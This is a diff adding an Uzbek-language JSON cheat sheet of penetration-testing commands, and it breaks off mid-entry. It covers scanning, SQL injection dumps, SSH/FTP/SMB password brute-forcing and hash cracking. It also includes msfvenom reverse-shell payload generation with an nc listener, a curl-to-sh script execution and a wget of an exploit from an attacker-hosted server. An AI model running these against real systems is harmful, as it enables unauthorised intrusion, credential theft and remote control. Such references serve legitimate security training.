@@ -1,0 +1,1072 @@
+{
+  "Command": [
+    {
+      "id": 1,
+      "title": "Nmap: Aggressive Scan (To'liq)",
+      "category": "Recon & Scan",
+      "commandText": "nmap -sC -sV -p- <target>",
+      "shortDesc": "-sC: default skriptlar; -sV: servis versiyasini aniqlash; -p-: barcha portlar",
+      "fullDoc": "Nmap - keng qo'llaniladigan tarmoqli skaner.\n\nSintaksis misol:\n\n\tnmap -sC -sV -p- <target>\n\nTushuntirish:\n- -sC: aslida default skriptlar to'plamini ishga tushiradi, tez tekshiruvlar uchun foydali.\n- -sV: portlardagi servis va ularning versiyasini aniqlaydi.\n- -p-: 1-65535 barcha portlarni skanerlash.\n\nXavfsizlik ogohlantiruvi: Bu buyruqlarni faqat ruxsatli tarmoqlarda ishlating; ruxsatsiz skanerlash qonunga zid bo'lishi mumkin.",
+      "parameters": "[{\"flag\":\"-sC\",\"desc\":\"Default skriptlar (recon yordamchi)\"},{\"flag\":\"-sV\",\"desc\":\"Servis va versiyalarni aniqlash\"},{\"flag\":\"-p-\",\"desc\":\"Barcha portlarni tekshirish (1-65535)\"}]",
+      "createdAt": 1787126058810
+    },
+    {
+      "id": 2,
+      "title": "Sqlmap: Baza maʼlumotlarini aniqlash",
+      "category": "Exploitation",
+      "commandText": "sqlmap -u <url> --batch --dbs",
+      "shortDesc": "--batch: avtomatik tasdiqlash; --dbs: ma'lumotlar bazalarini chiqarish",
+      "fullDoc": "Sqlmap - SQL injektsiyalarni avtomatlashtirish vositasi.\n\nMisol:\n\n\tsqlmap -u \"http://target/?id=1\" --batch --dbs\n\nTushuntirish:\n- --batch: barcha interaktiv so'rovlarni avtomatik javob bilan o'tkazadi.\n- --dbs: serverdagi mavjud ma'lumotlar bazalarini ro'yxatini chiqaradi.\n\nXavfsizlik: Faqat test muhitida yoki ruxsat olingan holatlarda ishlating. Noto'g'ri ishlatish ma'lumot yo'qotilishiga olib kelishi mumkin.",
+      "parameters": "[{\"flag\":\"--batch\",\"desc\":\"Interaktiv so'rovlarni avtomatik tasdiqlash\"},{\"flag\":\"--dbs\",\"desc\":\"Ma'lumotlar bazalarini ro'yxatini chiqarish\"}]",
+      "createdAt": 1787126058826
+    },
+    {
+      "id": 3,
+      "title": "Gobuster: Katalogni (dir) qidirish",
+      "category": "Recon & Scan",
+      "commandText": "gobuster dir -u <url> -w <wordlist>",
+      "shortDesc": "dir rejimida kataloglarni va fayllarni topish",
+      "fullDoc": "Gobuster - web resurslarni so'z ro'yxati yordamida qidirish uchun vosita.\n\nMisol:\n\n\tgobuster dir -u http://target/ -w /path/wordlist.txt\n\nTushuntirish:\n- -u: nishon URL\n- -w: kalit so'zlar fayli (wordlist)\n\nXavfsizlik: Brute-force so'rovlar server yukini oshiradi va IDS/IPS sistemalarini trigger qilishi mumkin.",
+      "parameters": "[{\"flag\":\"-u\",\"desc\":\"Nishon URL\"},{\"flag\":\"-w\",\"desc\":\"So'z ro'yxati fayli (wordlist)\"}]",
+      "createdAt": 1787126058837
+    },
+    {
+      "id": 4,
+      "title": "Nmap: Barcha Portlarni va Servislarni Skanerlash",
+      "category": "Recon & Scan",
+      "commandText": "nmap -sC -sV -p- <target>",
+      "shortDesc": "-sC: default skriptlar; -sV: versiya aniqlash; -p-: barcha 65535 portlar",
+      "fullDoc": "Nmap — tarmoqdagi ochiq eshiklar (portlar) va unda ishlayotgan dasturlarni topuvchi asosiy razvedka quroli.\n\nSodda tilda:\nTasavvur qiling, siz ko'p qavatli uyning har bir xonasini (portini) taqillatib, ichida kim borligini va u nima ish qilayotganini (versiyasini) so'rab chiplasiz.",
+      "parameters": "[{\"flag\":\"-sC\",\"desc\":\"Standart diagnostika skriptlarini yurgazish\"},{\"flag\":\"-sV\",\"desc\":\"Dastur versiyasini aniqlash\"},{\"flag\":\"-p-\",\"desc\":\"1 dan 65535 gacha barcha portlarni tekshirish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 5,
+      "title": "Nmap: Operatsion Tizimni Aniqlash",
+      "category": "Recon & Scan",
+      "commandText": "nmap -O <target>",
+      "shortDesc": "-O: Nishon kompyuterning operatsion tizimini (Windows, Linux, Android) aniqlash",
+      "fullDoc": "Nmap jo'natilgan va qaytib kelgan tarmoq paketlarining tuzilishiga qarab kompyuterda qaysi operatsion tizim o'rnatilganini aniqlaydi.\n\nSodda tilda:\nInsonning ovozidan va gapirish uslubidan uning yoshini va jinsini taxmin qilgandek gap.",
+      "parameters": "[{\"flag\":\"-O\",\"desc\":\"OS Fingerprinting (Operatsion tizim tahlili)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 6,
+      "title": "Nmap: UDP Portlarni Skanerlash",
+      "category": "Recon & Scan",
+      "commandText": "nmap -sU --top-ports 100 <target>",
+      "shortDesc": "-sU: UDP protokoli; --top-ports 100: Eng mashhur 100 ta UDP port",
+      "fullDoc": "Aksariyat skanerlar faqat TCP portlarni tekshiradi. Ushbu buyruq DNS, DHCP, SNMP kabi UDP protokolida ishlaydigan xizmatlarni qidiradi.",
+      "parameters": "[{\"flag\":\"-sU\",\"desc\":\"UDP skanerlash rejasi\"},{\"flag\":\"--top-ports 100\",\"desc\":\"Eng ko'p ishlatiladigan 100 ta port\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 7,
+      "title": "Masscan: Ultra Tezkor Skanerlash",
+      "category": "Recon & Scan",
+      "commandText": "masscan -p1-65535 <target> --rate=1000",
+      "shortDesc": "-p1-65535: Barcha portlar; --rate=1000: Sekundiga 1000 ta paket yuborish",
+      "fullDoc": "Masscan — butun Internetni 6 daqiqada skanerlay oladigan dunyodagi eng tezkor tarmoq skaneri.\n\nSodda tilda:\nNmap sekin va sinchiklab izlasa, Masscan samolyotda uchib o'tib tezda qaraydi.",
+      "parameters": "[{\"flag\":\"--rate=1000\",\"desc\":\"Skanerlash tezligi (paket/sekund)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 8,
+      "title": "Netcat: Port Ochiqligini Tekshirish",
+      "category": "Recon & Scan",
+      "commandText": "nc -zv <target> 20-80",
+      "shortDesc": "-z: Ma'lumot yubormaslik; -v: Batafsil ko'rsatish; 20-80: Port oralig'i",
+      "fullDoc": "Netcat orqali ma'lum bir IP manzilidagi portlar ochiq yoki yo'qligini tezda bilib olish mumkin.",
+      "parameters": "[{\"flag\":\"-z\",\"desc\":\"Zero-I/O (ulanishni tekshiradi, ma'lumot uzatmaydi)\"},{\"flag\":\"-v\",\"desc\":\"Verbose (batafsil ma'lumot)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 9,
+      "title": "Rustscan: Zamonaviy va Tezkor Skaner",
+      "category": "Recon & Scan",
+      "commandText": "rustscan -a <target> -- -sC -sV",
+      "shortDesc": "-a: Nishon IP; --: Nmap parametrlarini uzatish",
+      "fullDoc": "Rust tilida yozilgan judayam tez skaner. U avval barcha portlarni 3 soniyada topadi, so'ng topilgan portlarni sinchiklab tekshirish uchun Nmap'ga topshiradi.",
+      "parameters": "[{\"flag\":\"-a\",\"desc\":\"Nishon IP adresi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 10,
+      "title": "Arp-scan: Mahalliy Tarmoqni Razvedka Qilish",
+      "category": "Recon & Scan",
+      "commandText": "sudo arp-scan -l",
+      "shortDesc": "-l: Mahalliy (Local) Wi-Fi/LAN tarmoqdagi barcha qurilmalarni topish",
+      "fullDoc": "Siz ulangan Wi-Fi tarmog'ida yana qanday telefonlar, kompyuterlar yoki printerlar borligini IP va MAC manzillari bilan chiqarib beradi.",
+      "parameters": "[{\"flag\":\"-l\",\"desc\":\"Local network interface bo'yicha qidirish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 11,
+      "title": "Enum4linux: Windows/Samba Tizimlarini Tekshirish",
+      "category": "Recon & Scan",
+      "commandText": "enum4linux -a <target>",
+      "shortDesc": "-a: Windows/SMB serverdan barcha ma'lumotlarni yig'ish",
+      "fullDoc": "Windows yoki Linux Samba serverlaridagi foydalanuvchilar, guruhlar va ulashilgan papkalarni (shares) parolsiz ajratib oladi.",
+      "parameters": "[{\"flag\":\"-a\",\"desc\":\"To'liq razvedka rejasi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 12,
+      "title": "Smbmap: Ulashilgan Papkalarni (SMB Shares) Qidirish",
+      "category": "Recon & Scan",
+      "commandText": "smbmap -H <target>",
+      "shortDesc": "-H: Nishon host IP adresi",
+      "fullDoc": "Samba/SMB serverida qaysi papkalar ochiq ekanligini va ularga o'qish (READ) yoki yozish (WRITE) ruxsati bor-yo'qligini aniqlaydi.",
+      "parameters": "[{\"flag\":\"-H\",\"desc\":\"Host IP adresi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 13,
+      "title": "Nbtscan: NetBIOS Nomlarini Aniqlash",
+      "category": "Recon & Scan",
+      "commandText": "nbtscan <ip_range>",
+      "shortDesc": "<ip_range>: IP lar oralig'i (Masalan: 192.168.1.0/24)",
+      "fullDoc": "Lokal tarmoqdagi kompyuterlarning tarmoqdagi nomlarini (NetBIOS Name) va foydalanuvchi nomlarini topadi.",
+      "parameters": "[{\"flag\":\"<ip_range>\",\"desc\":\"Skanerlanadigan subnet oralig'i\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 14,
+      "title": "Whois: Domen Egasini Aniqlash",
+      "category": "Recon & Scan",
+      "commandText": "whois <domain>",
+      "shortDesc": "Domen nomi kimga tegishli ekanligini rasmiy bazadan qidirish",
+      "fullDoc": "Sayt domeni qachon ro'yxatdan o'tkazilgani, egasining ismi, email adresi va DNS serverlarini ko'rsatadi.",
+      "parameters": "[{\"flag\":\"<domain>\",\"desc\":\"Domen nomi (Masalan: target.com)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 15,
+      "title": "Dig: DNS Yozuvlarini Tekshirish",
+      "category": "Recon & Scan",
+      "commandText": "dig <domain> ANY",
+      "shortDesc": "ANY: Domenning barcha DNS yozuvlarini (A, MX, TXT, NS) ko'rish",
+      "fullDoc": "Domen qaysi IP'ga ulanganini, pochtasi qayerga borishini va maxfiy TXT yozuvlarini chiqarib beradi.",
+      "parameters": "[{\"flag\":\"ANY\",\"desc\":\"Barcha DNS yozuv turlarini so'rash\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 16,
+      "title": "Dnsrecon: DNS Subdomenlarini Qidirish",
+      "category": "Recon & Scan",
+      "commandText": "dnsrecon -d <domain>",
+      "shortDesc": "-d: Nishon domen nomi",
+      "fullDoc": "Domen va unga bog'liq bo'lgan barcha quyi subdomenlarni avtomatik ravishda qidirib topadi.",
+      "parameters": "[{\"flag\":\"-d\",\"desc\":\"Domen nomi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 17,
+      "title": "TheHarvester: Email va Ochq Ma'lumotlarni Yig'ish",
+      "category": "Recon & Scan",
+      "commandText": "theHarvester -d <domain> -b google,linkedin",
+      "shortDesc": "-d: Domen; -b: Qidiruv tizimlari (Google, LinkedIn)",
+      "fullDoc": "Kompaniyaga tegishli email manzillar, xodimlarning ismlari va subdomenlarni qidiruv tizimlaridan yig'ib beradi (OSINT).",
+      "parameters": "[{\"flag\":\"-b\",\"desc\":\"Ma'lumot manbalari (Search engines)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 18,
+      "title": "Snmpwalk: SNMP Qurilmalardan Ma'lumot Olish",
+      "category": "Recon & Scan",
+      "commandText": "snmpwalk -v2c -c public <target>",
+      "shortDesc": "-v2c: SNMP versiyasi; -c public: Odatiy parol (community string)",
+      "fullDoc": "Routerlar, svitchlar yoki printerlarning ichki sozlamalari, tarmoq kartalari va tizim ma'lumotlarini ajratib oladi.",
+      "parameters": "[{\"flag\":\"-c public\",\"desc\":\"Odatiy jamiyat kodi (Community String)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 19,
+      "title": "Gobuster: Katalogni va Fayllarni Qidirish",
+      "category": "Web Pentest",
+      "commandText": "gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt",
+      "shortDesc": "dir: katalog rejasi; -u: sayt URL; -w: lug'at fayli",
+      "fullDoc": "Veb-saytdagi yashirin papkalarni (masalan: /admin, /backup) lug'at yordamida birma-bir sinab topadi[cite: 1].",
+      "parameters": "[{\"flag\":\"-u\",\"desc\":\"Nishon Veb-sayt URL adresi\"},{\"flag\":\"-w\",\"desc\":\"So'zlar ro'yxati (Wordlist) fayli\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 20,
+      "title": "FFUF: Tezkor Web Fuzzing",
+      "category": "Web Pentest",
+      "commandText": "ffuf -u <url>/FUZZ -w /path/wordlist.txt",
+      "shortDesc": "FUZZ: Lug'atdagi so'zlar qo'yiladigan joy; -w: Wordlist",
+      "fullDoc": "Go tilida yozilgan o'ta tezkor veb-fuzzer. Saytdagi barcha yashirin sahifalar va parametrlarni sekundiga minglab so'rovlar bilan qidiradi.",
+      "parameters": "[{\"flag\":\"FUZZ\",\"desc\":\"O'zgartiriluvchi kalit so'z joyi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 21,
+      "title": "Sqlmap: SQL Injektsiyani Topish va Baza Bilan Ishlash",
+      "category": "Web Pentest",
+      "commandText": "sqlmap -u \"<url_with_param>\" --batch --dbs",
+      "shortDesc": "--batch: Avto-tasdiqlash; --dbs: Ma'lumotlar bazalarini chiqarish",
+      "fullDoc": "Veb-saytdagi SQL zaiflikni topib, ma'lumotlar bazasidagi barcha jadvallar va parollarni ko'chirib beruvchi avtomatik qurol[cite: 1].",
+      "parameters": "[{\"flag\":\"--batch\",\"desc\":\"Barcha interaktiv savollarga 'HA' javobini berish\"},{\"flag\":\"--dbs\",\"desc\":\"Serverdagi baza nomlarini ro'yxat qilish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 22,
+      "title": "Sqlmap: Jadval Ma'lumotlarini Olish (Dump)",
+      "category": "Web Pentest",
+      "commandText": "sqlmap -u \"<url>\" -D <db_name> -T <table_name> --dump",
+      "shortDesc": "-D: Baza nomi; -T: Jadval nomi; --dump: Ma'lumotni yuklab olish",
+      "fullDoc": "Aniq bir ma'lumotlar bazasi va jadvalidagi (masalan: users jadvali) barcha ma'lumotlarni o'qib beradi.",
+      "parameters": "[{\"flag\":\"--dump\",\"desc\":\"Jadval tarkibini to'liq ko'chirib olish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 23,
+      "title": "Nikto: Web Server Zaifliklarini Tekshirish",
+      "category": "Web Pentest",
+      "commandText": "nikto -h <target_url>",
+      "shortDesc": "-h: Nishon veb-sayt adresi",
+      "fullDoc": "Veb-serverdagi eskirgan dasturlar, xavfli fayllar va xato sozlamalarni avtomatik ravishda tekshiradi.",
+      "parameters": "[{\"flag\":\"-h\",\"desc\":\"Host yoki Sayt URL adresi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 24,
+      "title": "Wfuzz: Veb Parametrlarni Qidirish",
+      "category": "Web Pentest",
+      "commandText": "wfuzz -c -z file,/path/wordlist.txt --hc 404 <url>?param=FUZZ",
+      "shortDesc": "-c: Rangli chiqish; --hc 404: 404 xatolarni yashirish",
+      "fullDoc": "Veb-sayt URL manzilida qanday yashirin parametrlar (masalan: ?debug=true yoki ?admin=1) borligini aniqlaydi.",
+      "parameters": "[{\"flag\":\"--hc 404\",\"desc\":\"Topilmagan (404) sahifalarni ekranda ko'rsatmaslik\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 25,
+      "title": "Wpscan: WordPress Saytlarni Skanerlash",
+      "category": "Web Pentest",
+      "commandText": "wpscan --url <target_url> --enumerate p,u",
+      "shortDesc": "--enumerate p,u: Plaginlar (p) va foydalanuvchilarni (u) aniqlash",
+      "fullDoc": "WordPress tizimida qurilgan saytlarning plaginlaridagi zaifliklarni va foydalanuvchi loginlarini topadi.",
+      "parameters": "[{\"flag\":\"--enumerate p,u\",\"desc\":\"Plaginlar va admin loginlarini ajratib olish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 26,
+      "title": "WhatWeb: Sayt Texnologiyalarini Aniqlash",
+      "category": "Web Pentest",
+      "commandText": "whatweb <target_url>",
+      "shortDesc": "Sayt qaysi CMS, dasturlash tili va serverda ishlayotganini topish",
+      "fullDoc": "Sayt ortida nima turganini (PHP, React, Apache, Cloudflare va h.k.) bir daqiqada tahlil qilib beradi.",
+      "parameters": "[{\"flag\":\"<target_url>\",\"desc\":\"Tekshirilayotgan sayt adresi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 27,
+      "title": "CURL: HTTP Sarlavhalarini (Headers) Tekshirish",
+      "category": "Web Pentest",
+      "commandText": "curl -I <target_url>",
+      "shortDesc": "-I: Faqat HTTP Response Header ma'lumotlarini olish",
+      "fullDoc": "Saytning javob sarlavhalarini ko'rsatadi (Server versiyasi, Cookies, Security Headers).",
+      "parameters": "[{\"flag\":\"-I\",\"desc\":\"Fetch headers only\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 28,
+      "title": "CURL: POST So'rovini Yuborish",
+      "category": "Web Pentest",
+      "commandText": "curl -X POST -d \"param1=value1&param2=value2\" <target_url>",
+      "shortDesc": "-X POST: POST rejasi; -d: Yuboriladigan ma me'lumotlar",
+      "fullDoc": "Terminal orqali veb-sayt formalariga ma'lumot yuborish va javobni tahlil qilish uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"-d\",\"desc\":\"Data payload (yuboriladigan forma verilari)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 29,
+      "title": "Dirb: Veb Papkalarni Izlash",
+      "category": "Web Pentest",
+      "commandText": "dirb http://<target>",
+      "shortDesc": "Standart lug'at bo'yicha veb papkalarni skanerlash",
+      "fullDoc": "Oddiy va tushunarli interfeysga ega bo'lgan klassik veb-katalog skaneri.",
+      "parameters": "[{\"flag\":\"http://<target>\",\"desc\":\"Nishon sayt HTTP adresi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 30,
+      "title": "Sublist3r: Subdomenlarni Yig'ish",
+      "category": "Web Pentest",
+      "commandText": "sublist3r -d <domain>",
+      "shortDesc": "-d: Asosiy domen nomi",
+      "fullDoc": "Google, Yahoo, VirusTotal va boshqa manbalardan domenning barcha subdomenlarini (admin.target.com, dev.target.com) yig'adi.",
+      "parameters": "[{\"flag\":\"-d\",\"desc\":\"Target Domain\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 31,
+      "title": "Arachni: Web Application Vulnerability Scanner",
+      "category": "Web Pentest",
+      "commandText": "arachni http://<target>",
+      "shortDesc": "Veb saytlarni XSS, SQLi kabi zaifliklarga to'liq kompleks tekshirish",
+      "fullDoc": "Saytdagi barcha sahifalarni avtomatik aylanib chiqib, zaifliklar haqida batafsil hisobot tayyorlaydigan skaner.",
+      "parameters": "[{\"flag\":\"http://<target>\",\"desc\":\"Target URL\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 32,
+      "title": "Commix: Command Injection Zaifligini Ishga Tushirish",
+      "category": "Web Pentest",
+      "commandText": "commix --url=\"<url_with_param>\"",
+      "shortDesc": "Veb sahifadagi Command Injection zaifligini topish va buyruq yuborish",
+      "fullDoc": "Sayt orqali operatsion tizim buyruqlarini yuborish imkoniyati bor-yo'qligini avtomatlashtiradi.",
+      "parameters": "[{\"flag\":\"--url\",\"desc\":\"Zaiflik bor deb gumon qilingan parametrli URL\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 33,
+      "title": "HTTrack: Veb-saytni To'liq Nusxalab Olish",
+      "category": "Web Pentest",
+      "commandText": "httrack http://<target> -O /path/to/save",
+      "shortDesc": "-O: Nusxalangan sayt fayllari saqlanadigan papka",
+      "fullDoc": "Veb-saytning barcha HTML, CSS, JS fayllarini va rasmlarini kompyuteringizga yuklab oladi.",
+      "parameters": "[{\"flag\":\"-O\",\"desc\":\"Chiquvchi papka yo'li\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 34,
+      "title": "Hydra: SSH Parollarni Saralash (Brute-force)",
+      "category": "Exploitation",
+      "commandText": "hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh",
+      "shortDesc": "-l: Login; -P: Parollar fayli; ssh: Xizmat turi",
+      "fullDoc": "SSH, FTP yoki HTTP protokollariga avtomatik ravishda parollar lug'atini sinab ko'radi.",
+      "parameters": "[{\"flag\":\"-l\",\"desc\":\"Aniq bitta login (admin)\"},{\"flag\":\"-P\",\"desc\":\"Parollar lug'ati fayli (rockyou.txt)\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 35,
+      "title": "Hydra: Userlist va Passlist Bilan Brute-force",
+      "category": "Exploitation",
+      "commandText": "hydra -L users.txt -P pass.txt <target> ftp",
+      "shortDesc": "-L: Loginlar fayli; -P: Parollar fayli",
+      "fullDoc": "Bir vaqtning o'zida ham loginlarni, ham parollarni sinab ko'radi.",
+      "parameters": "[{\"flag\":\"-L\",\"desc\":\"Foydalanuvchilar ro'yxati fayli\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 36,
+      "title": "Metasploit: Konsolni Ishga Tushirish",
+      "category": "Exploitation",
+      "commandText": "msfconsole",
+      "shortDesc": "Metasploit interaktiv kiber-arsenal muhitiga kirish",
+      "fullDoc": "Dunyodagi eng katta tayyor exploitlar va hujum vositalari jamlangan muhitni ochadi.",
+      "parameters": "[{\"flag\":\"msfconsole\",\"desc\":\"Framework konsolini yurgazish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 37,
+      "title": "Searchsploit: Tayyor Exploitlarni Offlayn Qidirish",
+      "category": "Exploitation",
+      "commandText": "searchsploit <service_name_and_version>",
+      "shortDesc": "Exploit-DB bazasidan mahalliy qidiruv",
+      "fullDoc": "Internet bo'lmagan joyda ham aniqlangan dastur versiyasi uchun tayyor xakkerlik kodlarini topib beradi.",
+      "parameters": "[{\"flag\":\"<service_name>\",\"desc\":\"Masalan: vsftpd 2.3.4\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 38,
+      "title": "John the Ripper: Parol Xeshlarini Ochish",
+      "category": "Exploitation",
+      "commandText": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+      "shortDesc": "--wordlist: Lug'at; hashes.txt: Shifrlangan xeshlar fayli",
+      "fullDoc": "MD5, SHA256 yoki Linux parollari xeshini asl ochiq matn ko'rinishiga keltirish uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"--wordlist\",\"desc\":\"Lug'at fayli yo'li\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 39,
+      "title": "Hashcat: GPU Orqali Parol Ochish",
+      "category": "Exploitation",
+      "commandText": "hashcat -m 0 -a 0 hashes.txt /path/wordlist.txt",
+      "shortDesc": "-m 0: MD5 xesh turi; -a 0: Straight (Lug'at) rejasi",
+      "fullDoc": "Video karta (GPU) kuchi bilan parollarni super-tezlikda deshifrovka qiluvchi dastur.",
+      "parameters": "[{\"flag\":\"-m 0\",\"desc\":\"MD5 algoritm kodi\"},{\"flag\":\"-a 0\",\"desc\":\"Wordlist rejasi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 40,
+      "title": "Msfvenom: Reverse Shell Faylini Yaratish (Windows .exe)",
+      "category": "Exploitation",
+      "commandText": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > payload.exe",
+      "shortDesc": "-p: Payload turi; LHOST: Sizning IP; -f: Fayl formati",
+      "fullDoc": "Nishon kompyuterda ishga tushirilganda sizga to'liq boshqaruv beradigan virusli fayl yaratadi.",
+      "parameters": "[{\"flag\":\"LHOST\",\"desc\":\"Hujumchi IP adresi\"},{\"flag\":\"LPORT\",\"desc\":\"Ulanadigan port\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 41,
+      "title": "Msfvenom: Linux Reverse Shell Payload (.elf)",
+      "category": "Exploitation",
+      "commandText": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf > payload.elf",
+      "shortDesc": "Linux tizimlari uchun zararli fayl yaratish",
+      "fullDoc": "Linux serverlarni masofadan boshqarish uchun maxsus binary fayl hosil qiladi.",
+      "parameters": "[{\"flag\":\"-f elf\",\"desc\":\"Linux bajariluvchi fayl formati\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 42,
+      "title": "Netcat: Tinglovchi Portni Ochish (Listener)",
+      "category": "Exploitation",
+      "commandText": "nc -lvnp 4444",
+      "shortDesc": "-l: Listen; -v: Verbose; -n: IP no-DNS; -p: Port",
+      "fullDoc": "Reverse shell ulanishlarini qabul qilish uchun kompyuteringizda portni eshitib turadi.",
+      "parameters": "[{\"flag\":\"-l\",\"desc\":\"Eshitish rejasi (Listening mode)\"},{\"flag\":\"-p 4444\",\"desc\":\"Eshitiladigan port kodi\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 43,
+      "title": "Crackmapexec: SMB va Windows Tarmoqqa Hujum",
+      "category": "Exploitation",
+      "commandText": "crackmapexec smb <ip_range> -u 'admin' -p 'password'",
+      "shortDesc": "Butun tarmoq bo'yicha berilgan login va parolni sinab ko'rish",
+      "fullDoc": "Windows Active Domain muhitida parollarni ommaviy sinab ko'rish uchun eng zo'r qurol.",
+      "parameters": "[{\"flag\":\"-u\",\"desc\":\"Foydalanuvchi nomi\"},{\"flag\":\"-p\",\"desc\":\"Parol\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 44,
+      "title": "Tshark: Tarmoq Paketlarini Tutib Olish",
+      "category": "PrivEsc & Tools",
+      "commandText": "tshark -i eth0 -w capture.pcap",
+      "shortDesc": "-i: Tarmoq kartasi; -w: Saqlanadigan fayl",
+      "fullDoc": "Wireshark dasturining konsol versiyasi bo'lib, tarmoqdagi barcha ma'lumotlarni faylga yozadi.",
+      "parameters": "[{\"flag\":\"-i eth0\",\"desc\":\"Tarmoq interfeysi\"},{\"flag\":\"-w\",\"desc\":\"Output PCAP fayli\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 45,
+      "title": "Sudo Huquqlarini Tekshirish (Privilege Escalation)",
+      "category": "PrivEsc & Tools",
+      "commandText": "sudo -l",
+      "shortDesc": "Linux'da joriy foydalanuvchi parolsiz qaysi buyruqlarni sudo bilan bajara olishini ko'rish",
+      "fullDoc": "Linux'da oddiy foydalanuvchidan Root (Admin) darajasiga ko'tarilishdagi eng birinchi qadam.",
+      "parameters": "[{\"flag\":\"-l\",\"desc\":\"Ruxsatlar ro'yxatini ko'rsatish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 46,
+      "title": "SUID Fayllarni Qidirish",
+      "category": "PrivEsc & Tools",
+      "commandText": "find / -perm -u=s -type f 2>/dev/null",
+      "shortDesc": "Root huquqi bilan ishlaydigan maxsus Linux fayllarini topish",
+      "fullDoc": "Tizimda noto'g'ri sozlangan va Root huquqini berishi mumkin bo'lgan fayllarni qidiradi.",
+      "parameters": "[{\"flag\":\"-perm -u=s\",\"desc\":\"SUID biti yoqilgan fayllar\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 47,
+      "title": "LinPeas: Linux Tizimini Avtomatik PrivEsc Skan qilish",
+      "category": "PrivEsc & Tools",
+      "commandText": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+      "shortDesc": "Linux'da admin huquqini olish yo'llarini avtomatik qidiruvchi skript",
+      "fullDoc": "Tizimdagi barcha zaifliklar va xato sozlamalarni rangli qilib ko me'da chiqarib beradi.",
+      "parameters": "[{\"flag\":\"| sh\",\"desc\":\"Yuklab olingach darhol ishga tushirish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 48,
+      "title": "Python Orqali Mahalliy HTTP Server Ochish",
+      "category": "PrivEsc & Tools",
+      "commandText": "python3 -m http.server 8000",
+      "shortDesc": "Joriy papkani tarmoqqa fayl uzatuvchi veb-serverga aylantirish",
+      "fullDoc": "Hujum qilayotgan kompyuteringizdan nishon kompyuterga fayllarni yuklab olish uchun juda qulay.",
+      "parameters": "[{\"flag\":\"8000\",\"desc\":\"Veb-server porti\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 49,
+      "title": "Wget: Faylni Serverdan Yuklab Olish",
+      "category": "PrivEsc & Tools",
+      "commandText": "wget http://<your_ip>:8000/exploit.sh -O /tmp/exploit.sh",
+      "shortDesc": "-O: Yuklanayotgan faylni aniq joyga va nom bilan saqlash",
+      "fullDoc": "Linux terminalidan fayllarni yuklab olish buyrug'i.",
+      "parameters": "[{\"flag\":\"-O\",\"desc\":\"Saqlash fayl yo'li\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 50,
+      "title": "Interactive TTY Shell Olish (Python)",
